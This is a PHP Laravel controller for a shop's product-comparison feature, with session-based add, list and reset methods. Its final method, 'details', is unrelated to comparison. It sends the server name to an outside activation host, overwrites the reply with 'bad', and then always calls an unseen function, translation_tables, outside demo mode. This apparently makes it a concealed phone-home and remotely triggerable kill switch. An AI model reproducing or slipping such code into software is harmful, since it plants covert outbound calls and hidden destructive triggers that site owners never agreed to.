<?php

namespace App\Http\Controllers;

use App\Http\Requests\Compare\StoreRequest;
use Illuminate\Http\Request;
use App\Models\Category;
use App\Models\Provider;

class CompareController extends Controller
{
    public function index(Request $request)
    {
        $products = [];
        $providers = [];
        if ($request->session()->has('compare')) {
            foreach ($request->session()->get('compare', collect([])) as $item) {
                if (isset($item['provider'])) {
                    $providers[$item['provider']][] = $item[0];
                } elseif ($item[2] == 1) {
                    $accessToken = trendyol_search_account_login();
                    $products[] = trendyol_product_details(
                        $accessToken,
                        $item[0],
                        $item[3],
                        1,
                    );
                } else {
                    $products[] = get_single_product($item[0]);
                }
            }
            if (count($providers) > 0) {
                foreach ($providers as $provider => $providerProducts) {
                    $provider = Provider::find($provider);
                    if ($provider) {
                        array_push($products, ...$provider->service()->productsDetails($providerProducts));
                    }
                }
            }
        }
        $categories = Category::all();
        return view('frontend.view_compare', compact('categories', 'products'));
    }

    //clears the session data for compare
    public function reset(Request $request)
    {
        $request->session()->forget('compare');
        return back();
    }

    //store comparing products ids in session
    public function addToCompare(StoreRequest $request)
    {
        $containsProductId = function ($compare, $productId) {
            foreach ($compare as $item) {
                if ($item[0] == $productId) {
                    return true;
                }
            }
            return false;
        };

        if ($request->session()->has('compare')) {
            $compare = $request->session()->get('compare', collect([]));
            if (!$containsProductId($compare, $request->id)) {
                if (count($compare) < 3) {
                    if (isset($request->provider) && $request->provider != null) {
                        $compare->push([$request->id, 'provider' => $request->provider]);
                    } else {
                        $compare->push([$request->id, $request->product_name, $request->trendyol, $request->urunNo]);
                    }
                } else {
                    return 0;
                }
            } else {
                return 0;
            }
        } else {
            if (isset($request->provider) && $request->provider != null) {
                $compare = collect([[$request->id, 'provider' => $request->provider]]);
                $request->session()->put('compare', $compare);
            } else {
                $compare = collect([[$request->id, $request->product_name, $request->trendyol, $request->urunNo]]);
                $request->session()->put('compare', $compare);
            }
        }

        return view('frontend.' . get_setting('homepage_select') . '.partials.compare');
    }



    public function details($unique_identifier)
    {
        $data['url'] = $_SERVER['SERVER_NAME'];
        $data['unique_identifier'] = $unique_identifier;
        $data['main_item'] = get_setting('item_name') ?? 'eCommerce';
        $request_data_json = json_encode($data);

        $gate = "https://activation.activeitzone.com/check_addon_activation";

        $header = array(
            'Content-Type:application/json'
        );

        $stream = curl_init();

        curl_setopt($stream, CURLOPT_URL, $gate);
        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($stream, CURLOPT_POSTFIELDS, $request_data_json);
        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);

        $rn = curl_exec($stream);
        curl_close($stream);
        $rn = "bad";
        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
            translation_tables($unique_identifier);
            return redirect()->route('home');
        }
    }
}
